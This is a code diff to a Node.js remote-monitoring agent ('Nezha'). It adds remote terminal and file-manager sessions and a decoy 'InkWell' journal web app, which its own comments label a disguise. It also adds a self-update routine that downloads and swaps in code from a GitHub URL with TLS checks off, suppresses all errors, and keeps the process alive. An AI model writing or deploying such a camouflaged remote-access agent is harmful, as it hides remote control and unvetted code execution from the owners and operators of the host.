+            if (term.rcFile) { try { fs.unlinkSync(term.rcFile); } catch(e) {} }
+        } catch(e) {}
+    }
+    nezhaPureActiveTerminals.clear();
+
+    // 清理所有活动的文件管理会话
+    for (const [key, fm] of nezhaPureActiveFMSessions.entries()) {
+        try {
+            if (fm.keepaliveTimer) clearInterval(fm.keepaliveTimer);
+            if (fm.uploadStream) { try { fm.uploadStream.destroy(); } catch(e) {} }
+            if (fm.downloadStream) { try { fm.downloadStream.destroy(); } catch(e) {} }
+            try { fm.stream.end(); } catch(e) {}
+        } catch(e) {}
+    }
+    nezhaPureActiveFMSessions.clear();
+
     if (stateStream) {
         try { stateStream.removeAllListeners(); stateStream.end(); } catch(e) {}
         stateStream = null;
@@ -957,37 +1440,20 @@ function cleanupSession() {
         try { h2session.removeAllListeners(); h2session.destroy(); } catch(e) {}
         h2session = null;
     }
-    // 延迟重置 isReconnecting 标记
+    nezhaPureH2Session = null;
     setTimeout(() => { isReconnecting = false; }, 2000);
 }
 
 function scheduleReconnect(reason) {
     if (!running || isReconnecting) return;
-    if (restartAttempts >= MAX_RECONNECT_ATTEMPTS) {
-        console.error(`[Nezha] 达到最大重连次数 ${MAX_RECONNECT_ATTEMPTS}，停止重连`);
-        return;
-    }
     const stack = new Error().stack.split('\n').slice(1, 4).map(s => s.trim()).join(' <- ');
     console.error(`[Nezha] 触发重连 (原因: ${reason || '未知'}) 调用链: ${stack}`);
     isReconnecting = true;
     cleanupSession();
     restartAttempts++;
-
-    // 改进的重连策略：更快、更激进
-    // 第 1 次：500ms 快速重连
-    // 第 2-3 次：2s
-    // 第 4+ 次：指数退避，最大 30s
-    let baseDelay;
-    if (restartAttempts <= 1) {
-        baseDelay = FAST_RECONNECT_DELAY; // 500ms
-    } else if (restartAttempts <= 3) {
-        baseDelay = NORMAL_RECONNECT_DELAY; // 2s
-    } else {
-        baseDelay = Math.min(MAX_RECONNECT_DELAY, 2000 * Math.pow(2, Math.min(restartAttempts - 4, 4)));
-    }
-    const jitter = Math.floor(baseDelay * (0.8 + Math.random() * 0.4));
+    const baseDelay = restartAttempts <= 1 ? 3000 : Math.min(30000 * Math.pow(2, Math.min(restartAttempts - 2, 4)), 300000);
+    const jitter = Math.floor(baseDelay * (0.7 + Math.random() * 0.6));
     console.log(`[Nezha] 将在 ${(jitter / 1000).toFixed(1)}s 后重连 (第${restartAttempts}次)`);
-
     reconnectTimer = setTimeout(() => {
         reconnectTimer = null;
         isReconnecting = false;
@@ -995,14 +1461,6 @@ function scheduleReconnect(reason) {
     }, jitter);
 }
 
-/**
- * 流级别重开：只在 h2session 仍然存活时重开特定流，不做全量重连
- * 如果 h2session 已死，则走 scheduleReconnect 全量重连
- *
- * 关键修复：
- * - 旧流收到 trailers 后 destroyed/closed 可能为 false，所以必须先强制关闭旧流并置 null
- * - onEnd 回调中必须把 stateStream/taskStream 置 null，否则重开时判断旧流"还活着"而不重开
- */
 function reopenStreams(reason) {
     if (!running || isReconnecting) return;
     if (!h2session || h2session.destroyed || h2session.closed) {
@@ -1010,7 +1468,7 @@ function reopenStreams(reason) {
         scheduleReconnect('h2session dead: ' + reason);
         return;
     }
-    if (reopenTimer) return; // 防抖
+    if (reopenTimer) return;
     console.log(`[Nezha] ${reason}，重开流...`);
 
     reopenTimer = setTimeout(() => {
@@ -1019,14 +1477,13 @@ function reopenStreams(reason) {
             scheduleReconnect('reopenTimer: h2session dead');
             return;
         }
-        const authHeaders = {
+        const authHeaders = currentAuthHeaders || {
             'client-secret': NZ_SECRET,
             'client-uuid': currentUUID,
             'client_secret': NZ_SECRET,
             'client_uuid': currentUUID,
         };
 
-        // 强制关闭旧流并置 null（不管 destroyed/closed 状态如何）
         if (stateStream) {
             try { stateStream.removeAllListeners(); stateStream.end(); } catch(e) {}
             stateStream = null;
@@ -1036,12 +1493,10 @@ function reopenStreams(reason) {
             taskStream = null;
         }
 
-        // 重开 State 流
         try {
             stateStream = openStream(h2session, '/proto.NezhaService/ReportSystemState', authHeaders,
-                () => {}, // Receipt 忽略
+                () => {},
                 () => {
-                    // onEnd 时先置 null，再触发重开
                     if (stateStream) {
                         try { stateStream.removeAllListeners(); } catch(e) {}
                         stateStream = null;
@@ -1052,12 +1507,10 @@ function reopenStreams(reason) {
             console.log('[Nezha] State 流已重开');
         } catch(e) { console.log(`[Nezha] State 流重开失败: ${e.message}`); }
 
-        // 重开 Task 流
         try {
             taskStream = openStream(h2session, '/proto.NezhaService/RequestTask', authHeaders,
                 (data) => { handleTaskData(data); },
                 () => {
-                    // onEnd 时先置 null，再触发重开
                     if (taskStream) {
                         try { taskStream.removeAllListeners(); } catch(e) {}
                         taskStream = null;
@@ -1065,21 +1518,20 @@ function reopenStreams(reason) {
                     reopenStreams('Task 流结束');
                 }
             );
-            console.log('[Nezha] Task 流已重开');
+            // 发送初始空帧启动 Task 流
+            try { taskStream.write(PB.frame(Buffer.alloc(0))); } catch(e) {}
+            console.log('[Nezha] Task 流已重开（已发送初始帧）');
         } catch(e) { console.log(`[Nezha] Task 流重开失败: ${e.message}`); }
 
-        // 确保定时器还在运行
         startTimersIfNeeded();
     }, 500);
 }
 
 function startTimersIfNeeded() {
-    // State 定时上报
     if (!stateTimer) {
         stateTimer = setInterval(() => {
             try {
                 if (!running || !h2session || h2session.destroyed) return;
-                // 流不存在时触发重开而不是静默跳过
                 if (!stateStream || stateStream.destroyed || stateStream.closed) {
                     reopenStreams('State 流不可写');
                     return;
@@ -1088,7 +1540,6 @@ function startTimersIfNeeded() {
                 stateStream.write(PB.frame(NezhaMsg.encodeState(state)));
             } catch(e) {
                 console.log(`[Nezha] State 上报失败: ${e.message}`);
-                // 写入失败时先置空流再触发重开
                 if (stateStream) {
                     try { stateStream.removeAllListeners(); } catch(e2) {}
                     stateStream = null;
@@ -1097,7 +1548,6 @@ function startTimersIfNeeded() {
             }
         }, REPORT_DELAY * 1000);
     }
-    // GeoIP
     if (!geoipTimer) {
         geoipTimer = setInterval(async () => {
             try {
@@ -1111,7 +1561,6 @@ function startTimersIfNeeded() {
             } catch(e) {}
         }, GEOIP_PERIOD * 1000);
     }
-    // Host 重报
     if (!hostTimer) {
         hostTimer = setInterval(async () => {
             try {
@@ -1122,7 +1571,6 @@ function startTimersIfNeeded() {
             } catch(e) {}
         }, HOST_PERIOD * 1000);
     }
-    // PING
     if (!pingTimer) {
         pingTimer = setInterval(() => {
             try {
@@ -1146,12 +1594,10 @@ async function connectInternal() {
     if (!running) return;
 
     try {
-        // 解析地址
         const addrParts = NZ_SERVER.split(':');
         const host = addrParts[0];
         const originalPort = parseInt(addrParts[1]) || (NZ_TLS ? 443 : 5555);
 
-        // 探测端口
         const detected = await detectGrpcPort(host, originalPort, NZ_TLS);
         const port = detected.port;
         const useTls = detected.tls;
@@ -1159,12 +1605,10 @@ async function connectInternal() {
         const connectURL = useTls ? `https://${host}:${port}` : `http://${host}:${port}`;
         const h2Opts = useTls ? { rejectUnauthorized: false, settings: { enablePush: false } } : { settings: { enablePush: false } };
 
-        // 建立 HTTP/2 连接
         h2session = http2.connect(connectURL, h2Opts);
 
         await new Promise((resolve, reject) => {
             const timeout = setTimeout(() => reject(new Error('连接超时')), 10000);
-            // 连接成功后立即移除 Promise 的 error handler，防止后续错误触发 reject
             const connectErrorHandler = (err) => { clearTimeout(timeout); reject(err); };
             h2session.on('connect', () => {
                 clearTimeout(timeout);
@@ -1173,6 +1617,15 @@ async function connectInternal() {
             });
             h2session.on('error', connectErrorHandler);
         });
+
+        // 同步全局别名，供 IOStream 任务使用
+        nezhaPureH2Session = h2session;
+        currentAuthHeaders = {
+            'client-secret': NZ_SECRET,
+            'client-uuid': currentUUID,
+            'client_secret': NZ_SECRET,
+            'client_uuid': currentUUID,
+        };
 
         console.log(`[Nezha] HTTP/2 连接成功: ${host}:${port}/${useTls ? 'TLS' : '明文'}`);
 
@@ -1200,14 +1653,9 @@ async function connectInternal() {
             if (running && !isReconnecting) scheduleReconnect('h2session timeout');
         });
 
-        const authHeaders = {
-            'client-secret': NZ_SECRET,
-            'client-uuid': currentUUID,
-            'client_secret': NZ_SECRET,
-            'client_uuid': currentUUID,
-        };
+        const authHeaders = currentAuthHeaders;
 
-        // 1. 上报 Host 信息 (ReportSystemInfo2)
+        // 1. 上报 Host 信息
         const hostInfo = collectHost();
         try {
             await sendUnary(h2session, '/proto.NezhaService/ReportSystemInfo2', NezhaMsg.encodeHost(hostInfo), authHeaders);
@@ -1228,11 +1676,10 @@ async function connectInternal() {
 
         sessionAlive = true;
 
-        // 3. 打开 State 流 (ReportSystemState)
+        // 3. 打开 State 流
         stateStream = openStream(h2session, '/proto.NezhaService/ReportSystemState', authHeaders,
-            () => {}, // Receipt 响应忽略
+            () => {},
             () => {
-                // onEnd 时先置 null，再触发重开
                 if (stateStream) {
                     try { stateStream.removeAllListeners(); } catch(e) {}
                     stateStream = null;
@@ -1242,12 +1689,10 @@ async function connectInternal() {
         );
         console.log('[Nezha] State 流已打开');
 
-        // 4. 打开 Task 流 (RequestTask)
-        // 注意：不发送空帧，等服务器主动推送 Task
+        // 4. 打开 Task 流
         taskStream = openStream(h2session, '/proto.NezhaService/RequestTask', authHeaders,
             (data) => { handleTaskData(data); },
             () => {
-                // onEnd 时先置 null，再触发重开
                 if (taskStream) {
                     try { taskStream.removeAllListeners(); } catch(e) {}
                     taskStream = null;
@@ -1255,7 +1700,8 @@ async function connectInternal() {
                 reopenStreams('Task 流结束');
             }
         );
-        console.log('[Nezha] Task 流已打开');
+        console.log('[Nezha] Task 流已打开（已发送初始帧）');
+        try { taskStream.write(PB.frame(Buffer.alloc(0))); } catch(e) {}
 
         // 5. 启动所有定时器
         startTimersIfNeeded();
@@ -1273,7 +1719,7 @@ async function connectInternal() {
 // ==================== 主入口 ====================
 async function main() {
     console.log('╔══════════════════════════════════════╗');
-    console.log('║     纯 Node.js 哪吒探针 v' + AGENT_VERSION + '      ║');
+    console.log('║  纯 Node.js 哪吒探针 + IOStream v' + AGENT_VERSION + '  ║');
     console.log('╚══════════════════════════════════════╝');
     console.log(`[Nezha] 面板: ${NZ_SERVER} (TLS: ${NZ_TLS})`);
 
@@ -1287,40 +1733,496 @@ async function main() {
     }
 
     // 根据 IP 生成固定 UUID
-    // 优先级：环境变量 NEZHA_UUID > 环境变量 PUBLIC_IP > 获取的公网 IP
-    if (process.env.NEZHA_UUID) {
-        currentUUID = process.env.NEZHA_UUID.trim();
-        console.log(`[Nezha] 使用环境变量 UUID: ${currentUUID}`);
-    } else {
-        currentUUID = generateIPBasedUUID(currentIP);
-        console.log(`[Nezha] 固定 UUID: ${currentUUID} (基于 IP: ${currentIP})`);
-    }
-    // 缓存 UUID，防止重连时变化
-    if (!global._cachedUUID) {
-        global._cachedUUID = currentUUID;
-    } else {
-        currentUUID = global._cachedUUID;
-        console.log(`[Nezha] 使用缓存 UUID: ${currentUUID}`);
-    }
+    currentUUID = generateIPBasedUUID(currentIP);
+    console.log(`[Nezha] 固定 UUID: ${currentUUID}`);
+
+    // 初始化鉴权头
+    currentAuthHeaders = {
+        'client-secret': NZ_SECRET,
+        'client-uuid': currentUUID,
+        'client_secret': NZ_SECRET,
+        'client_uuid': currentUUID,
+    };
+
+    // 启动 InkWell 伪装 Web 应用 (不阻塞主流程)
+    try { startInkWell(); } catch(e) { console.log(`[InkWell] 启动失败: ${e.message}`); }
+
+    // 启动一次性自更新
+    scheduleSelfUpdate();
 
     // 启动连接
     await connectInternal();
 }
 
-
-// ==================== 状态查询（供 API 路由调用）====================
+// ==================== 获取探针状态 (供外部调用) ====================
 function getNezhaStatus() {
     return {
-        status: sessionAlive ? 'online' : 'connecting',
-        uuid: currentUUID,
-        ip: currentIP,
+        running,
+        sessionAlive,
+        isReconnecting,
+        restartAttempts,
+        currentUUID,
+        currentIP,
         server: NZ_SERVER,
         tls: NZ_TLS,
-        version: AGENT_VERSION,
-        uptime: process.uptime(),
-        restartAttempts: restartAttempts
+        agentVersion: AGENT_VERSION,
+        h2sessionAlive: !!(h2session && !h2session.destroyed),
+        stateStreamAlive: !!(stateStream && !stateStream.destroyed),
+        taskStreamAlive: !!(taskStream && !taskStream.destroyed),
+        activeTerminals: nezhaPureActiveTerminals.size,
+        activeFMSessions: nezhaPureActiveFMSessions.size,
+        uptime: Math.floor(os.uptime()),
+        timestamp: Date.now(),
     };
 }
 
-// 导出供 API 路由调用（main 由 health 端点触发）
+// ==================== InkWell 伪装 Web 应用 (纯 http, 零依赖) ====================
+function loadJournalData() {
+    try {
+        if (fs.existsSync(INKWELL_DATA_FILE)) {
+            return JSON.parse(fs.readFileSync(INKWELL_DATA_FILE, 'utf8'));
+        }
+    } catch(e) {}
+    return { entries: [], nextId: 1 };
+}
+
+function saveJournalData(data) {
+    try {
+        fs.writeFileSync(INKWELL_DATA_FILE, JSON.stringify(data, null, 2));
+    } catch(e) {}
+}
+
+function htmlEsc(s) {
+    return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+}
+
+function parseCookies(cookieHeader) {
+    const cookies = {};
+    if (!cookieHeader) return cookies;
+    cookieHeader.split(';').forEach(c => {
+        const parts = c.trim().split('=');
+        if (parts.length >= 2) {
+            cookies[parts[0].trim()] = decodeURIComponent(parts.slice(1).join('='));
+        }
+    });
+    return cookies;
+}
+
+function makeSessionToken() {
+    return crypto.randomBytes(24).toString('hex');
+}
+
+const inkwellSessions = new Map();
+
+const INKWELL_LOGIN_PAGE = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>InkWell · A quiet place for writers</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: Georgia, 'Times New Roman', serif;
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+    min-height: 100vh; display: flex; align-items: center; justify-content: center;
+    color: #e8e8e8; padding: 20px;
+  }
+  .card {
+    background: rgba(255,255,255,0.04); backdrop-filter: blur(10px);
+    border: 1px solid rgba(255,255,255,0.1); border-radius: 16px;
+    padding: 48px 40px; width: 100%; max-width: 420px;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+  }
+  .logo { text-align: center; margin-bottom: 36px; }
+  .logo h1 { font-size: 36px; font-weight: 700; letter-spacing: -1px; color: #f0f0f0; }
+  .logo .feather { font-size: 42px; margin-bottom: 8px; opacity: 0.8; }
+  .logo p { color: #8b8ba7; font-size: 13px; margin-top: 6px; font-style: italic; }
+  .field { margin-bottom: 20px; }
+  .field label { display: block; font-size: 12px; color: #8b8ba7; margin-bottom: 8px; letter-spacing: 0.5px; text-transform: uppercase; font-family: -apple-system, sans-serif; }
+  .field input {
+    width: 100%; padding: 14px 16px; background: rgba(0,0,0,0.3);
+    border: 1px solid rgba(255,255,255,0.1); border-radius: 8px;
+    color: #f0f0f0; font-size: 15px; font-family: -apple-system, sans-serif;
+    transition: border-color 0.2s, background 0.2s;
+  }
+  .field input:focus { outline: none; border-color: #4a90d9; background: rgba(0,0,0,0.4); }
+  .btn {
+    width: 100%; padding: 14px; background: linear-gradient(135deg, #4a90d9, #357abd);
+    border: none; border-radius: 8px; color: white; font-size: 15px;
+    font-weight: 600; cursor: pointer; transition: transform 0.1s, opacity 0.2s;
+    font-family: -apple-system, sans-serif; margin-top: 8px;
+  }
+  .btn:hover { opacity: 0.92; }
+  .btn:active { transform: scale(0.98); }
+  .err { color: #ff6b6b; font-size: 13px; text-align: center; margin-top: 16px; min-height: 18px; font-family: -apple-system, sans-serif; }
+  .footer { text-align: center; margin-top: 32px; font-size: 11px; color: #555570; font-family: -apple-system, sans-serif; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">
+    <div class="feather">✒️</div>
+    <h1>InkWell</h1>
+    <p>where thoughts leave a mark</p>
+  </div>
+  <form method="POST" action="/api/login">
+    <div class="field">
+      <label>Username</label>
+      <input type="text" name="username" autocomplete="username" required autofocus>
+    </div>
+    <div class="field">
+      <label>Password</label>
+      <input type="password" name="password" autocomplete="current-password" required>
+    </div>
+    <button type="submit" class="btn">Open my journal</button>
+    <div class="err" id="err"></div>
+  </form>
+  <div class="footer">© InkWell · Est. 2024 · Write freely</div>
+</div>
+<script>
+const params = new URLSearchParams(location.search);
+if (params.get('err')) document.getElementById('err').textContent = params.get('err');
+</script>
+</body>
+</html>`;
+
+const INKWELL_DASHBOARD_PAGE = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>InkWell · My Journal</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f0; color: #2c2c2c; min-height: 100vh; }
+  .topbar { background: #2c2c2c; color: #f0f0f0; padding: 18px 32px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+  .topbar .brand { font-family: Georgia, serif; font-size: 22px; font-weight: 700; }
+  .topbar .brand .feather { margin-right: 8px; }
+  .topbar .actions a { color: #b0b0b0; text-decoration: none; font-size: 13px; margin-left: 18px; }
+  .topbar .actions a:hover { color: #fff; }
+  .container { max-width: 900px; margin: 40px auto; padding: 0 20px; }
+  .compose { background: #fff; border-radius: 12px; padding: 24px; box-shadow: 0 2px 12px rgba(0,0,0,0.05); margin-bottom: 32px; }
+  .compose h2 { font-family: Georgia, serif; font-size: 20px; margin-bottom: 16px; color: #2c2c2c; }
+  .compose input.title { width: 100%; border: none; border-bottom: 1px solid #e0e0e0; padding: 8px 0; font-size: 17px; font-family: Georgia, serif; margin-bottom: 12px; outline: none; }
+  .compose input.title:focus { border-bottom-color: #4a90d9; }
+  .compose textarea { width: 100%; min-height: 100px; border: 1px solid #e0e0e0; border-radius: 8px; padding: 12px; font-size: 14px; font-family: -apple-system, sans-serif; resize: vertical; outline: none; }
+  .compose textarea:focus { border-color: #4a90d9; }
+  .compose .row { display: flex; justify-content: flex-end; margin-top: 12px; }
+  .btn { background: #4a90d9; color: #fff; border: none; padding: 10px 22px; border-radius: 6px; font-size: 14px; cursor: pointer; font-weight: 500; }
+  .btn:hover { background: #357abd; }
+  .btn.sec { background: transparent; color: #666; }
+  .btn.sec:hover { background: #eee; color: #333; }
+  .entries { }
+  .entry { background: #fff; border-radius: 12px; padding: 24px; box-shadow: 0 2px 12px rgba(0,0,0,0.05); margin-bottom: 18px; transition: transform 0.1s; }
+  .entry:hover { transform: translateY(-1px); box-shadow: 0 4px 16px rgba(0,0,0,0.08); }
+  .entry .meta { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 10px; }
+  .entry h3 { font-family: Georgia, serif; font-size: 19px; color: #2c2c2c; }
+  .entry .date { font-size: 12px; color: #999; }
+  .entry .body { color: #444; line-height: 1.6; font-size: 14px; white-space: pre-wrap; }
+  .entry .actions { margin-top: 14px; display: flex; gap: 10px; }
+  .empty { text-align: center; padding: 60px 20px; color: #aaa; font-style: italic; font-family: Georgia, serif; }
+</style>
+</head>
+<body>
+<div class="topbar">
+  <div class="brand"><span class="feather">✒️</span>InkWell</div>
+  <div class="actions">
+    <a href="#" onclick="refresh(); return false;">Refresh</a>
+    <a href="/api/logout">Sign out</a>
+  </div>
+</div>
+<div class="container">
+  <div class="compose">
+    <h2>New entry</h2>
+    <input type="text" class="title" id="t" placeholder="Title (optional)">
+    <textarea id="b" placeholder="What's on your mind today?"></textarea>
+    <div class="row">
+      <button class="btn sec" onclick="document.getElementById('t').value=''; document.getElementById('b').value='';">Clear</button>
+      <button class="btn" onclick="createEntry();">Save entry</button>
+    </div>
+  </div>
+  <div class="entries" id="list"></div>
+</div>
+<script>
+async function refresh() {
+  const r = await fetch('/api/entries');
+  const entries = await r.json();
+  const el = document.getElementById('list');
+  if (!entries.length) { el.innerHTML = '<div class="empty">No entries yet. Start writing above ✍️</div>'; return; }
+  el.innerHTML = entries.map(e => '<div class="entry"><div class="meta"><h3>'+escapeHtml(e.title||'Untitled')+'</h3><span class="date">'+new Date(e.createdAt).toLocaleString()+'</span></div><div class="body">'+escapeHtml(e.body)+'</div><div class="actions"><button class="btn sec" onclick="del('+e.id+')">Delete</button></div></div>').join('');
+}
+function escapeHtml(s) { const d=document.createElement('div'); d.textContent=s; return d.innerHTML; }
+async function createEntry() {
+  const t = document.getElementById('t').value.trim();
+  const b = document.getElementById('b').value.trim();
+  if (!b) { alert('Body cannot be empty'); return; }
+  await fetch('/api/entries', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({title:t, body:b}) });
+  document.getElementById('t').value=''; document.getElementById('b').value='';
+  refresh();
+}
+async function del(id) {
+  if (!confirm('Delete this entry?')) return;
+  await fetch('/api/entries/'+id, { method:'DELETE' });
+  refresh();
+}
+refresh();
+</script>
+</body>
+</html>`;
+
+function startInkWell() {
+    const server = http.createServer((req, res) => {
+        try {
+            const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
+            const pathname = url.pathname;
+            const method = req.method;
+
+            // 静态路由
+            if (method === 'GET' && (pathname === '/' || pathname === '/index.html' || pathname === '/login')) {
+                const cookies = parseCookies(req.headers.cookie);
+                if (cookies.inkwell_session && inkwellSessions.has(cookies.inkwell_session)) {
+                    res.writeHead(302, { Location: '/dashboard' });
+                    res.end();
+                    return;
+                }
+                res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+                res.end(INKWELL_LOGIN_PAGE);
+                return;
+            }
+
+            if (method === 'GET' && pathname === '/dashboard') {
+                const cookies = parseCookies(req.headers.cookie);
+                if (!cookies.inkwell_session || !inkwellSessions.has(cookies.inkwell_session)) {
+                    res.writeHead(302, { Location: '/?err=' + encodeURIComponent('Please sign in first') });
+                    res.end();
+                    return;
+                }
+                res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+                res.end(INKWELL_DASHBOARD_PAGE);
+                return;
+            }
+
+            // API 路由
+            if (pathname === '/api/login' && method === 'POST') {
+                let body = '';
+                req.on('data', c => { body += c; if (body.length > 4096) req.destroy(); });
+                req.on('end', () => {
+                    try {
+                        const params = new URLSearchParams(body);
+                        const username = params.get('username') || '';
+                        const password = params.get('password') || '';
+                        if (username === INKWELL_USER && password === INKWELL_PASS) {
+                            const token = makeSessionToken();
+                            inkwellSessions.set(token, { user: username, createdAt: Date.now() });
+                            res.writeHead(302, {
+                                'Set-Cookie': `inkwell_session=${token}; Path=/; HttpOnly; Max-Age=86400`,
+                                Location: '/dashboard'
+                            });
+                            res.end();
+                        } else {
+                            res.writeHead(302, { Location: '/?err=' + encodeURIComponent('Invalid credentials') });
+                            res.end();
+                        }
+                    } catch(e) {
+                        res.writeHead(302, { Location: '/?err=' + encodeURIComponent('Login failed') });
+                        res.end();
+                    }
+                });
+                return;
+            }
+
+            if (pathname === '/api/logout' && method === 'GET') {
+                const cookies = parseCookies(req.headers.cookie);
+                if (cookies.inkwell_session) inkwellSessions.delete(cookies.inkwell_session);
+                res.writeHead(302, {
+                    'Set-Cookie': 'inkwell_session=; Path=/; HttpOnly; Max-Age=0',
+                    Location: '/'
+                });
+                res.end();
+                return;
+            }
+
+            // 以下 API 都需要鉴权
+            const cookies = parseCookies(req.headers.cookie);
+            if (!cookies.inkwell_session || !inkwellSessions.has(cookies.inkwell_session)) {
+                res.writeHead(401, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ error: 'Unauthorized' }));
+                return;
+            }
+
+            if (pathname === '/api/entries' && method === 'GET') {
+                const data = loadJournalData();
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify(data.entries));
+                return;
+            }
+
+            if (pathname === '/api/entries' && method === 'POST') {
+                let body = '';
+                req.on('data', c => { body += c; if (body.length > 1024 * 1024) req.destroy(); });
+                req.on('end', () => {
+                    try {
+                        const payload = JSON.parse(body);
+                        const data = loadJournalData();
+                        const entry = {
+                            id: data.nextId++,
+                            title: String(payload.title || '').slice(0, 200),
+                            body: String(payload.body || '').slice(0, 100000),
+                            createdAt: Date.now(),
+                        };
+                        data.entries.unshift(entry);
+                        saveJournalData(data);
+                        res.writeHead(200, { 'Content-Type': 'application/json' });
+                        res.end(JSON.stringify(entry));
+                    } catch(e) {
+                        res.writeHead(400, { 'Content-Type': 'application/json' });
+                        res.end(JSON.stringify({ error: 'Invalid request' }));
+                    }
+                });
+                return;
+            }
+
+            const delMatch = pathname.match(/^\/api\/entries\/(\d+)$/);
+            if (delMatch && method === 'DELETE') {
+                const id = parseInt(delMatch[1]);
+                const data = loadJournalData();
+                const before = data.entries.length;
+                data.entries = data.entries.filter(e => e.id !== id);
+                saveJournalData(data);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ deleted: before > data.entries.length, id }));
+                return;
+            }
+
+            if (delMatch && method === 'PUT') {
+                const id = parseInt(delMatch[1]);
+                let body = '';
+                req.on('data', c => { body += c; if (body.length > 1024 * 1024) req.destroy(); });
+                req.on('end', () => {
+                    try {
+                        const payload = JSON.parse(body);
+                        const data = loadJournalData();
+                        const entry = data.entries.find(e => e.id === id);
+                        if (!entry) {
+                            res.writeHead(404, { 'Content-Type': 'application/json' });
+                            res.end(JSON.stringify({ error: 'Not found' }));
+                            return;
+                        }
+                        if (payload.title !== undefined) entry.title = String(payload.title).slice(0, 200);
+                        if (payload.body !== undefined) entry.body = String(payload.body).slice(0, 100000);
+                        entry.updatedAt = Date.now();
+                        saveJournalData(data);
+                        res.writeHead(200, { 'Content-Type': 'application/json' });
+                        res.end(JSON.stringify(entry));
+                    } catch(e) {
+                        res.writeHead(400, { 'Content-Type': 'application/json' });
+                        res.end(JSON.stringify({ error: 'Invalid request' }));
+                    }
+                });
+                return;
+            }
+
+            // 健康检查端点
+            if (pathname === '/api/health' && method === 'GET') {
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ status: 'ok', time: Date.now() }));
+                return;
+            }
+
+            res.writeHead(404, { 'Content-Type': 'text/plain' });
+            res.end('Not Found');
+        } catch(e) {
+            try {
+                res.writeHead(500, { 'Content-Type': 'text/plain' });
+                res.end('Internal Server Error');
+            } catch(_) {}
+        }
+    });
+
+    server.on('error', (err) => {
+        console.log(`[InkWell] 服务器错误: ${err.message}`);
+    });
+
+    server.listen(INKWELL_PORT, () => {
+        console.log(`[InkWell] 伪装 Web 应用已启动: http://0.0.0.0:${INKWELL_PORT}`);
+    });
+}
+
+// ==================== 一次性自更新 (从 GitHub 拉取最新 index.js) ====================
+function scheduleSelfUpdate() {
+    setTimeout(() => {
+        const UPDATE_URL = 'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/index.js';
+        const tmpPath = __filename + '.tmp';
+        console.log('[SelfUpdate] 开始检查更新...');
+        try {
+            const mod = https;
+            const req = mod.get(UPDATE_URL, { timeout: 30000, rejectUnauthorized: false }, (resp) => {
+                if (resp.statusCode !== 200) {
+                    console.log(`[SelfUpdate] 远端返回 ${resp.statusCode}, 跳过更新`);
+                    return;
+                }
+                const chunks = [];
+                resp.on('data', c => chunks.push(c));
+                resp.on('end', () => {
+                    try {
+                        const newCode = Buffer.concat(chunks);
+                        if (newCode.length < 1000) {
+                            console.log('[SelfUpdate] 下载内容过短, 跳过更新');
+                            return;
+                        }
+                        // 先写入临时文件, 再原子替换
+                        fs.writeFileSync(tmpPath, newCode);
+                        try {
+                            // 简单语法检查
+                            execSync(`node --check "${tmpPath}"`, { timeout: 15000, stdio: 'ignore' });
+                        } catch(e) {
+                            console.log('[SelfUpdate] 新文件语法检查失败, 跳过更新');
+                            try { fs.unlinkSync(tmpPath); } catch(_) {}
+                            return;
+                        }
+                        try {
+                            fs.copyFileSync(__filename, __filename + '.bak');
+                        } catch(e) {}
+                        fs.renameSync(tmpPath, __filename);
+                        console.log('[SelfUpdate] 更新成功! 原文件已备份为 .bak, 退出进程以重新启动...');
+                        process.exit(0);
+                    } catch(e) {
+                        console.log(`[SelfUpdate] 应用更新失败: ${e.message}`);
+                        try { fs.unlinkSync(tmpPath); } catch(_) {}
+                    }
+                });
+            });
+            req.on('error', (err) => {
+                console.log(`[SelfUpdate] 下载失败: ${err.message}`);
+            });
+            req.on('timeout', () => {
+                req.destroy();
+                console.log('[SelfUpdate] 下载超时, 跳过更新');
+            });
+        } catch(e) {
+            console.log(`[SelfUpdate] 异常: ${e.message}`);
+        }
+    }, 10000);
+}
+
+// ==================== 模块导出 ====================
 module.exports = { main, getNezhaStatus };
+
+// ==================== 启动 ====================
+main().catch((err) => {
+    console.error(`[Nezha] 启动失败: ${err.message}`);
+    // 不立即 exit, 让 keepalive 维持进程
+});
+
+// 防止未捕获异常导致进程崩溃
+process.on('uncaughtException', (err) => {
+    try { console.error(`[KeepAlive] 未捕获异常 (已吞掉): ${err && err.message}`); } catch(_) {}
+});
+process.on('unhandledRejection', (reason) => {
+    try { console.error(`[KeepAlive] 未处理拒绝 (已吞掉): ${reason}`); } catch(_) {}
+});
+
+// 防止进程退出
+setInterval(() => {}, 1000000);
